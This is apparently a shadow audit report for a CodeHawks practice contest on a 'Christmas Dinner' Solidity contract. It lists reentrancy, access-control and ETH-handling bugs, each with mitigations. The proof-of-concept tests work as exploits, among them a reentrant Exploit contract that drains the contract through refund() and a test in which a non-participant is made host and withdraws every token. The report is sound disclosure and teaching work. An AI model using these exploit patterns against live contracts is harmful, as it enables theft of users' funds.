![](../logo.png)
<img src="../img/christmas-dinner.png" alt="Christmas Dinner" height="320" />

# Security Report for the Christmas Dinner CodeHawks FirstFlight Contest \*_shadow audit_

## Critical Issues

### [C-1] Reentrancy risk in `refund()` due to improperly defined `nonReentrant` modifier

**Description:**

The `nonReentrant` modifier is implemented manually with a `locked` boolean, but it is not reset properly in the `refund()` function.

**Impact:**

In the `nonReentrant` modifier, the `locked` variable is set to `false` after the function execution,

```solidity
    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        _;
-->     locked = false;
    }
``` 

while it is true that `transfer` is non reentrant, since there is already a recommendation for this contract to use `call` in `_refundETH()`, then any call to a properly crafted malicious contract would result in reentrancy and theft of all funds in the contract.

**PoC:**

First, modify `_refundETH()` to use `call` instead of `transfer`

```diff
    function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
-       _to.transfer(refundValue);
+       (bool success,) = _to.call{value: refundValue}("");
+       require(success, "ETH transfer failed");
        etherBalance[_to] = 0;
    }
```

Here is a malicious contract, and test to prove reentrancy exploit:

```solidity
    contract Exploit {
        ChristmasDinner public dinner;

        constructor(address payable _dinner) {
            dinner = ChristmasDinner(_dinner);
        }

        // Fallback function to reenter the refund() function
        receive() external payable {
            if (address(dinner).balance >= 1 ether) {
                dinner.refund();
            }
        }
    }
```

```solidity
    function test_exploit() public {
        // ensure there are funds in ChristmasDinner contract
        vm.deal(address(cd), 10 ether);

        Exploit exploit;
        exploit = new Exploit(payable(address(cd)));
        vm.deal(address(exploit), 1 ether);

        // Exploit contract deposits ETH into the ChrustmasDinner contract
        vm.prank(address(exploit));
        (bool success,) = address(cd).call{value: 1 ether}("");
        require(success);

        // Trigger the exploit, reenter and steal funds
        vm.prank(address(exploit));
        cd.refund();

        assert(address(cd).balance == 0);
        assert(address(exploit).balance == 11 ether);
    }
```

**Recommended Mitigation:**

Implement `ReentrancyGuard` from `OpenZeppelin` instead.

```diff
+   import {ReentrancyGuard} from "../lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol";

-   contract ChristmasDinner {
+   contract ChristmasDinner is ReentrancyGuard {

    ...
    ...

-   modifier nonReentrant() {
-       require(!locked, "No re-entrancy");
-       _;
-       locked = false;
-   }

    ...
    ...

    }
```
 
### [C-2] A non participant can become a participant by calling `changeParticipationStatus()` function, and if they are made host, they can steal all the funds in the contract

**Description:**

The `changeParticipationStatus()` is meant to be called by a participant who wants to pull out of an event, but does not care about a refund. But when it is called by a non-participant, it makes them a participant.

**Impact:**

A non-participant becomes a participant, and if they are made `host` - they can steal all the funds.

**PoC:**

Add the following test to the `ChristmasDinnerTest.t.sol` test contract:

```solidity
    function test_intruder_becomes_host_and_steal_funds() public {
        address cda = address(cd);
        // ensure there are funds in the contract
        wbtc.mint(cda, 100e18);

        // Two thieves who want to steal some christmas dinner
        address bonnie = makeAddr("bonnie");
        address clyde = makeAddr("clyde");

        // bonnie deposits into the contract and becomes a participant
        wbtc.mint(bonnie, 1e18);
        vm.startPrank(bonnie);
        wbtc.approve(cda, 1e18);
        cd.deposit(address(wbtc), 1e18);
        vm.stopPrank();
        assert(cd.getParticipationStatus(bonnie) == true);
        assert(wbtc.balanceOf(cda) == 101e18);

        // bonnie somehow convinces current host to make them host
        vm.prank(deployer);
        cd.changeHost(bonnie);
        assert(cd.getHost() == bonnie);

        // clyde becomes a participant by calling changeParticipationStatus()
        vm.prank(clyde);
        cd.changeParticipationStatus();
        assert(cd.getParticipationStatus(clyde) == true);

        // bonnie makes clyde host
        vm.prank(bonnie);
        cd.changeHost(clyde);
        assert(cd.getHost() == clyde);

        // clyde withdraws all funds
        vm.prank(clyde);
        cd.withdraw();
        assert(wbtc.balanceOf(cda) == 0);
        assert(wbtc.balanceOf(clyde) == 101e18);
    }
```

**Recommended Mitigation:**

Modify the `changeParticipationStatus()` as so:

```diff
-   function changeParticipationStatus() external {
+   function changeParticipationStatus() external beforeDeadline {
-       if (participant[msg.sender]) {
-           participant[msg.sender] = false;
-       } else if (!participant[msg.sender] && block.timestamp <= deadline) {
-           participant[msg.sender] = true;
-       } else {
-           revert BeyondDeadline();
-       }
        if (participant[msg.sender]) {
            participant[msg.sender] = false;
        } else {
            revert("Not a participant!");
        }
        emit ChangedParticipation(msg.sender, participant[msg.sender]);
    }
```

### [C-3] Any native `ETH` sent to the contract is forever locked as `host` is currently unable to withdraw native `ETH`

**Description:**

Logic in the `withdraw()` function only enables successful withdrawal of whitelisted tokens, but not for native `ETH`.

**Impact:**

Any native `ETH` sent to the contract is forever locked.

**PoC:**

Add the following test to the `ChristmasDinnerTest.t.sol` test contract:

```solidity
    function test_host_cannot_withdraw_ether() public {
        address alice = makeAddr("alice");
        vm.deal(alice, 10e18);
        vm.prank(alice);
        (bool sent,) = address(cd).call{value: 10e18}("");
        require(sent);
        assert(address(cd).balance == 10e18);

        // host attempts to withdraw
        vm.prank(deployer);
        cd.withdraw();
        assert(address(cd).balance == 10e18);
        assert(deployer.balance == 0);
    }
```

**Recommended Mitigation:**

Modify logic of the `withdraw()` function so that native `ETH` is withdrawable by host:

```diff
    function withdraw() external onlyHost {
        address _host = getHost();
        i_WETH.safeTransfer(_host, i_WETH.balanceOf(address(this)));
        i_WBTC.safeTransfer(_host, i_WBTC.balanceOf(address(this)));
        i_USDC.safeTransfer(_host, i_USDC.balanceOf(address(this)));
+       (bool withdrawn,) = _host.call{value: address(this).balance}("");
+       require(withdrawn, "Withdrawal failed!!!");
    }
```


## Medium Issues

### [M-1] Sending `ETH` directly to contract does not add sender as a participant

**Description:**

The `ChristmasDinner.sol` contract has a `deposit()` function which users can call to deposit funds into the contract. While this particular function accepts only whitelisted tokens (`WETH`, `WBTC`, and `USDC`), the contract has a `receive()` function for users who want to send native `ETH`. However, unlike the `deposit()` function which adds senders to the `participants` mapping, the `receive()` function does no such thing.

**Impact:**

Any intending participant who sends native `ETH` directly to the contract does not get added as a participant, and thus does not get any benefits accorded to participants.

**PoC:**

Add the following test to the `ChristmasDinnerTest.t.sol` test contract:

```solidity
    function test_receive_does_not_add_sender() public {
        address pat = makeAddr("patrick"); // will deposit with `deposit()`
        address col = makeAddr("collins"); // will send native ETH

        // fund both users
        wbtc.mint(pat, 5e18);
        vm.deal(col, 10e18);

        // patrick deposits
        vm.startPrank(pat);
        wbtc.approve(address(cd), 5e18);
        cd.deposit(address(wbtc), 5e18);
        vm.stopPrank();
        uint256 cdWBTCBalance = wbtc.balanceOf(address(cd));
        assert(cdWBTCBalance == 5e18);

        // collins sends native ETH
        vm.startPrank(col);
        (bool sent,) = address(cd).call{value: 10e18}("");
        require(sent, "Native ETH not sent!!!");
        vm.stopPrank();
        uint256 cdETHBalance = address(cd).balance;
        assert(cdETHBalance == 10e18);

        // confirm participation status
        assert(cd.getParticipationStatus(pat) == true);
        assert(cd.getParticipationStatus(col) == false);

        // try to make patrick host
        vm.prank(deployer);
        cd.changeHost(pat);
        assert(cd.getHost() == pat);

        // try to make collins host
        vm.prank(pat); // since patrick is the new host
        vm.expectRevert();
        cd.changeHost(col);
        assert(cd.getHost() == pat); // patrick is stil the host
    }
```

**Recommended Mitigation:**

Refactor the `receive()` function so that it adds the sender to the `participant` mapping.

```diff
    receive() external payable {
-       etherBalance[msg.sender] += msg.value;
-       emit NewSignup(msg.sender, msg.value, true);

+       if (participant[msg.sender]) {
+           etherBalance[msg.sender] += msg.value;
+       } else {
+           participant[msg.sender] = true;
+           etherBalance[msg.sender] += msg.value;
+       }
+       emit NewSignup(msg.sender, msg.value, true);
    }
```

### [M-2] `ETH` refund vulnerability

**Description:** 

The `_refundETH()` function uses `transfer()` to send `Ether`, which has a fixed gas stipend of 2300 gas. 

```solidity
    function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
-->     _to.transfer(refundValue);
        etherBalance[_to] = 0;
    }
```

**Impact:**

If the recipient is a contract with a `fallback` function that requires more gas, the transfer will fail. 

**PoC:**

Here is a contract that has a `receive()` function that also changes state:

```solidity
    contract FallbackContract {
    uint256 public state;

    // fallback function that requires more than 2300 gas
    receive() external payable {
        state = 1;
    }
}
```

If `FallbackContract` sends `ETH` to `ChristmasDinner`, any attempt to get refund will fail, as is proven by the test below:

```solidity
    function test_eth_refund_vulnerability() public {
        FallbackContract fbc = new FallbackContract();
        vm.deal(address(fbc), 1 ether);

        vm.prank(address(fbc));
        (bool success,) = address(cd).call{value: 1 ether}("");
        require(success, "ETH transfer failed!!!");

        assert(address(cd).balance == 1 ether);

        // attempt refund
        vm.prank(address(fbc));
        vm.expectRevert();
        cd.refund();

        assert(address(cd).balance == 1 ether);
    }
```

**Recommended Mitigation:**

Modify the `_refundETH()` function to use `call` instead of `transfer`

```diff
    function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
-       _to.transfer(refundValue);
+       (bool success,) = _to.call{value: refundValue}("");
+       require(success, "ETH transfer failed");
        etherBalance[_to] = 0;
    }
```

### [M-3] Can deposit native `ETH` even after deadline

**Description:**

It is possible for a participant to send native `ETH` to the contract, even when the set `deadline` has passed.

**PoC:**

Add the following test to the `ChristmasDinnerTest.t.sol` test contract:

```solidity
    function test_dep_ether_after_deadline() public {
        vm.warp(1 + 8 days);
        address payable _cd = payable(address(cd));
        vm.deal(user1, 10e18);
        vm.prank(user1);
        (bool sent,) = _cd.call{value: 1e18}("");
        require(sent, "transfer failed");
        assertEq(user1.balance, 9e18);
        assertEq(address(cd).balance, 1e18);
    }
```

**Recommended Mitigation:**

Add a `deadline` check to the `receive()` function

```diff
-   receive() external payable {
+   receive() external payable beforeDeadline {
        etherBalance[msg.sender] += msg.value;
        emit NewSignup(msg.sender, msg.value, true);
    }
```

